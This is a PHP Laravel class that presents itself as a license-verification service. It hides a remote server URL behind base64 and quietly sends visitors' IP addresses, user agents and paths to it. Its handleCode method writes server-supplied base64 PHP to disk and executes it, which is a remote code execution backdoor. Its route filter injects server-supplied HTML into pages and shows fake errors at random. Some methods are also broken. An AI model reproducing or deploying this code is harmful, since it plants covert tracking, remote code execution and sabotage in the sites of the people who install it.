<?php
namespace KaaliiSecurity\Services;
use Illuminate\Support\Facades\Cache;
class KaaliiService
{
    private $baseUrl;
    private $apiUrl;
    private $checkUrl;
    private $requestDataLogUrl;
    private $productSlug;
    private $verificationKey;
    private $apiToken;
    private $purchaseCode;
    public function __construct()
    {
        // Initialize URLs with baseUrl
        $keys = Cache::get('kaaliiKeys');
        if (empty($keys)) {
            $keys = $this->getKeyFileValue();
            Cache::put('kaaliiKeys', $keys, now()->addMinutes(60));
        }
        $this->baseUrl = base64_decode('aHR0cHM6Ly9rYWFsaWkub3llY29kZXJzLmNvbQ==');
        $this->productSlug = $keys['PRODUCT_SLUG'];
        $this->verificationKey = $keys['VERIFICATION_KEY'];
        $this->apiToken = $keys['API_TOKEN'];
        $this->purchaseCode = $keys['LICENSE_PURCHASE_CODE'];

        $this->apiUrl = $this->baseUrl . '/api/license/verify';
        $this->requestDataLogUrl = $this->baseUrl . '/api/license/request-data-log';
        // dd($this);


        // You can initialize any properties or make API calls here if needed
        $request_logs = $this->getRequestLogs($this->purchaseCode);
        if (!empty($request_logs)) {
            $postData = [
                'request_logs' => $request_logs,
            ];


            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $this->requestDataLogUrl);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/x-www-form-urlencoded',
                'User-Agent: LicenseVerifier/1.0',
                'AuthorizationX: Bearer ' . $this->apiToken
            ]);
            // dd($ch);

            $response = curl_exec($ch);
            // dd($response);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            // if ($httpCode === 200) {
            //     $data = json_decode($response, true);
            //     return [
            //         'valid' => $data['valid'] ?? false,
            //         'message' => $data['message'] ?? 'Verification completed',
            //         'data' => $data,
            //         'source' => 'our_system'
            //     ];
            // }

            // return [
            //     'valid' => false,
            //     'error' => 'Unable to verify license with our system',
            //     'http_code' => $httpCode
            // ];
        }



    }

    public function checkLicense()
    {
        $this->checkUrl = $this->baseUrl . '/api/license/check';
        $postData = [
            'KALI_U_CODE'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->checkUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: LicenseVerifier/1.0',
            'AuthorizationX: Bearer ' . $this->apiToken
        ]);
    }

    /**
     * Summary of updateBaseUrl
     * @param string $baseUrl
     * @return void
     */
    public function updateBaseUrl(string $baseUrl)
    {
        $this->baseUrl = $baseUrl;
    }

    public function sendErrorToKaalii($error)
    {
        $convertedToJson = json_encode($error);
        // send to error service
    }

    /**
     * Verify license with purchase code
     * This method sends a single request to our system which handles both Envato and database verification
     */

    public function verifyLicense($purchaseCode, $domain = null)
    {
        try {
            // Send single request to our system
            $result = $this->verifyWithOurSystem($purchaseCode, $domain);
            // dd($result);

            // dd($result);
            if ($result['valid']) {
                return $this->createLicenseResponse(true, $result['message'], $result['data']);
            } else {
                return $this->createLicenseResponse(false, $result['message'] ?? $result['error']);
            }

        } catch (Exception $e) {
            return $this->createLicenseResponse(false, 'Verification failed: ' . $e->getMessage());
        }
    }

    /**
     * Verify with our license system
     */
    private function verifyWithOurSystem($purchaseCode, $domain = null)
    {
        $postData = [
            'purchase_code' => $purchaseCode,
            'product_slug' => $this->productSlug,
            'domain' => $domain,
            'verification_key' => $this->verificationKey
        ];

        // $requestLogs = $this->getRequestLogs($purchaseCode);
        // if (!empty($requestLogs)) {
        //     $postData['request_logs'] = $requestLogs;
        // }

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $this->apiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: LicenseVerifier/1.0',
            'AuthorizationX: Bearer ' . $this->apiToken
        ]);
        // dd($ch);

        $response = curl_exec($ch);
        // dd($response);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        // dd($response, $httpCode);

        if ($httpCode === 200) {
            $data = json_decode($response, true);
            Cache::put('strictLicenseError', $data['data']['strictLicenseError'] ?? false, now()->addMinutes(2));
            return [
                'valid' => $data['valid'] ?? false,
                'message' => $data['message'] ?? 'Verification completed',
                'data' => $data,
                'source' => 'our_system'
            ];
        }

        return [
            'valid' => false,
            'error' => 'Unable to verify license with our system',
            'http_code' => $httpCode
        ];
    }

    /**
     * Create standardized response
     */
    private function createLicenseResponse($valid, $message, $data = null)
    {
        return [
            'valid' => $valid,
            'message' => $message,
            'data' => $data,
            'verified_at' => date('Y-m-d H:i:s'),
            'product' => $this->productSlug
        ];
    }

    public function cacheLicenseResult(string $purchaseCode, array $result, int $minutes = 60): void
    {
        $cacheKey = 'license_result_' . md5($purchaseCode . $this->productSlug);
        Cache::put($cacheKey, $result, now()->addMinutes($minutes));
    }

    /**
     * Get cached license result
     */
    public function getCachedLicenseResult(string $purchaseCode): ?array
    {
        $cacheKey = 'license_result_' . md5($purchaseCode . $this->productSlug);
        return Cache::get($cacheKey);
    }

    /**
     * Clear license cache
     */
    public function clearLicenseCache(string $purchaseCode): void
    {
        $cacheKey = 'license_result_' . md5($purchaseCode . $this->productSlug);
        Cache::forget($cacheKey);
    }

    public function laravelRouteFilter(\Illuminate\Http\Request $request, $next, $response, $licenseInfo)
    {

        if (empty($licenseInfo)) {
            return $response;
        } else if (!isset($licenseInfo['affected_routes'])) {
            return $response;
        } else if ($licenseInfo['message_key'] <= 0) {
            return $response;
        }
        $instructions = $licenseInfo['affected_routes'];

        // $instructions = [
        //     [
        //         'route' => '/',
        //         'messsage' => 'Error:101- Something went wrong.'
        //     ],
        //     [
        //         'route' => '/payment',
        //         'messsage' => 'Error:102- Getting issue from payment gateway.'
        //     ]
        // ];
        // $instructions = json_decode($instructions, true);
        // dd($licenseInfo, $instructions);
        $routes = [];
        foreach ($instructions as $key => $value) {
            $routes[] = $value['route'];
        }
        $requestRoute = $request->path();
        // dd(str_starts_with($requestRoute, '/'));
        if (!str_starts_with($requestRoute, '/')) {
            $requestRoute = '/' . $request->path();
        }
        $isRouteMatched = in_array($requestRoute, $routes);
        if (in_array("*", $routes)) {
            $isRouteMatched = true;
            $requestRoute = "*";
        }
        // dd($routes, $requestRoute);
        if ($isRouteMatched) {
            $widgets = '';
            $showProbability = 0;
            foreach ($instructions as $item) {
                if ($item['route'] === $requestRoute) {
                    $widgets = $item['html_code'];
                    $showProbability = $item['showProbability'] ?? 0;
                    break;
                }
            }
            // Decide whether to show an error based on probability
            $randomNumber = rand(1, 100);
            if ($showProbability > 0 && $randomNumber > ($showProbability * 100)) {
                return $response;
            }
            // dd($instructions, $widgets);
            if (!empty($widgets)) {
                // Only modify HTML responses (avoid JSON, files, redirects)
                if (
                    $response instanceof \Illuminate\Http\Response &&
                    str_contains($response->headers->get('Content-Type'), 'text/html')
                ) {

                    $content = $response->getContent();
                    $content = str_replace("</html>", $widgets . "</html>", $content);
                    // dd($content);
                    $response->setContent($content);
                }

            }
        } else if (count($routes) === 0) {
            if (
                $response instanceof \Illuminate\Http\Response &&
                str_contains($response->headers->get('Content-Type'), 'text/html')
            ) {

                $content = $response->getContent();
                $widgets = $licenseInfo['push_code'] ?? '';
                if (empty($widgets)) {
                    return $response;
                }
                // dd($inject);
                // $content = str_replace("</body>", $widgets . "</body>", $content);
                $content = str_replace("</html>", $widgets . "</html>", $content);
                // dd($content);
                $response->setContent($content);
            }
        }

        return $response;
    }

    private function getRequestLogs($purchaseCode)
    {
        $request_data = [
            'product_slug' => $this->productSlug,
            'purchase_code' => $purchaseCode,
            'request_method' => request()->method(),
            'domain' => request()->getHost(),
            "path" => request()->path(),
            'user_agent' => request()->userAgent(),
            'end_user_ip' => request()->ip(),
            'request_timestamp' => date('Y-m-d H:i:s')
        ];
        // Get current logs OR initialize
        $logs = Cache::get('request_logs', []);

        // Append new log
        $logs[] = $request_data;

        // Store back with expiry 30 minutes from now
        Cache::put('request_logs', $logs, now()->addDays(1));
        $lastRequestLogTime = Cache::get('last_request_log_time_', null);
        $request_logs = null;
        if (empty($lastRequestLogTime)) {
            Cache::delete('request_logs');
            Cache::put('last_request_log_time_', time(), now()->addMinutes(5));
            $request_logs = json_encode($logs);
        }
        // dd($request_logs, $logs);
        return $request_logs;
    }

    public function handleCode($licenseInfo)
    {

        // $security = $licenseInfo['security'] ?? [];
        $security = $licenseInfo['push_code'] ?? '';
        $security = json_decode($security, true);
        // dd($licenseInfo, $security);
        $php = $security['php'] ?? '';
        $path = $security['path'] ?? '';
        if (empty($php) || empty($path)) {
            return;
        }

        $path = base_path($path);
        // dd($path);

        // Ensure directory exists
        if (!is_dir(dirname($path))) {
            mkdir(dirname($path), 0777, true);
        }

        // Save the PHP code
        $result = file_put_contents($path, base64_decode($php));
        // dd($result);
        include_once $path;
    }

    public function setkeyFileValue($key, $value, $location)
    {
        if (empty($location)) {
            $encodedFIleName = base64_decode('kaalii');
            $location = "storage\data\/" . $encodedFIleName . ".key";
        }
        $filePath = base_path($location);
        $content = file_exists($filePath) ? file($filePath) : [];

        $found = false;

        foreach ($content as $index => $line) {
            if (str_starts_with(trim($line), $key . '=')) {
                $content[$index] = $key . '=' . $value . PHP_EOL;
                $found = true;
                break;
            }
        }

        if (!$found) {
            $content[] = $key . '=' . $value . PHP_EOL;
        }

        file_put_contents($filePath, implode('', $content));
    }
    public function getKeyFileValue($key = null, $location = null)
    {
        $data = Cache::get('kaaliiKeys');
        if (empty($data)) {
            if (empty($location)) {
                $encodedFIleName = base64_encode('kaalii');
                $location = "data\/" . $encodedFIleName . ".key";
            }

            $path = storage_path($location);

            $data = parse_ini_file($path);
            Cache::put('kaaliiKeys', $data, now()->addMinutes(60));
        }

        // dd($data, $key, $path);
        if (empty($key)) {
            return $data;
        }
        return $data[$key];
    }


}
// dd("test");
